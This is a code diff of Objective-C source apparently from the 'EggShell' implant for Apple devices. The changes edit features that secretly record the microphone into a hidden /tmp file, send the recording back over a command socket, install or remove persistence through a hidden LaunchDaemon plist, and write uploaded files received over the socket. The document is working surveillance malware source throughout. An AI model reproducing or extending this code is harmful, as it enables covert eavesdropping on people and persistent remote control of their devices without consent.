@@ -169,26 +169,25 @@ int sockfd;
     if ([[self forgetFirst:args] isEqual:@"start"]) {
         [[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryRecord withOptions:AVAudioSessionCategoryOptionMixWithOthers error:nil];
         
-        NSString *destinationString = @"/tmp/.esmic.caf";
+        NSString *destinationString = @"/tmp/.esmic.aac";
         NSURL *destinationURL = [NSURL fileURLWithPath: destinationString];
         NSDictionary *mysettings = @{AVFormatIDKey: @(kAudioFormatMPEG4AAC),
                                      AVEncoderAudioQualityKey: @(AVAudioQualityHigh),
                                      AVNumberOfChannelsKey: @1,
                                      AVSampleRateKey: @22050.0f};
         [[AVAudioSession sharedInstance] setActive:YES error:nil];
-        
         recorder = [[AVAudioRecorder alloc] initWithURL:destinationURL settings:mysettings error:nil];
+        recorder.meteringEnabled = true;
         recorder.delegate = self;
         
         [recorder prepareToRecord];
         [recorder record];
-
         [self sendString:@"Listening..."];
     }
     else if ([[self forgetFirst:args] isEqual:@"stop"]) {
         if ([recorder isRecording]) {
             [recorder stop];
-            [self download:[[NSArray alloc] initWithObjects:@"download",@"/tmp/.esmic.caf", nil]];
+            [self download:[[NSArray alloc] initWithObjects:@"download",@"/tmp/.esmic.aac", nil]];
         }
         else {
             [self sendString:@"-1"];
@@ -198,9 +197,6 @@ int sockfd;
         [self sendString:usage];
     }
 }
-
-
-
 
 //MARK: File Management
 
@@ -227,7 +223,6 @@ int sockfd;
         result = [result substringToIndex:[result length] - 1];
     }
     [self sendString:result];
-    //[self sendString:[NSString stringWithFormat:@"%lu",(unsigned long)[result length] ]:skey];
 }
 
 -(void)rmFile:(NSArray *)args {
@@ -650,6 +645,7 @@ int sockfd;
         [self sendString:@"Persistence Installed"];
     }
 }
+
 -(void)rmpersistence {
     NSString *loaderpath = @"/Library/LaunchDaemons/.esploader.plist";
     if ([_fileManager fileExistsAtPath:loaderpath]) {
@@ -664,22 +660,24 @@ int sockfd;
 
 //MARK: EggShell Pro
 
--(void)upload:(int)size :(NSString *)uploadpath {
-    long dinc = 0;
-    NSString *filedata = @"";
-    while(1) {
-        char buffer[1024];
-        read(sockfd, &buffer, sizeof(buffer));
-        filedata = [NSString stringWithFormat:@"%@%s",filedata,buffer];
-        dinc += 1024;
-        memset(buffer,'\0',1024);
-        if (strstr([filedata UTF8String],[_terminator UTF8String])) {
-            filedata = [filedata stringByReplacingOccurrencesOfString:_terminator withString:@""];
-            break;
+-(void)upload:(NSString *)uploadpath {
+    @autoreleasepool {
+        long dinc = 0;
+        NSString *filedata = @"";
+        while(1) {
+            char buffer[1024];
+            read(sockfd, &buffer, sizeof(buffer));
+            filedata = [NSString stringWithFormat:@"%@%s",filedata,buffer];
+            dinc += 1024;
+            memset(buffer,'\0',1024);
+            if (strstr([filedata UTF8String],[_terminator UTF8String])) {
+                filedata = [filedata stringByReplacingOccurrencesOfString:_terminator withString:@""];
+                break;
+            }
         }
+        NSData *fdata = [[NSData alloc] initWithBase64EncodedString:filedata options:NSDataBase64DecodingIgnoreUnknownCharacters];
+        [fdata writeToFile:uploadpath atomically:true];
     }
-    NSData *fdata = [[NSData alloc] initWithBase64EncodedString:filedata options:NSDataBase64DecodingIgnoreUnknownCharacters];
-    [fdata writeToFile:uploadpath atomically:true];
 }
 
 -(void)mcSendNoReply:(NSString *)command {
@@ -691,7 +689,6 @@ int sockfd;
         [self sendString:@"You dont have eggshellPro Extension"];
     }
 }
-
 
 -(void)mcSendYesReply:(NSString *)command {
     NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
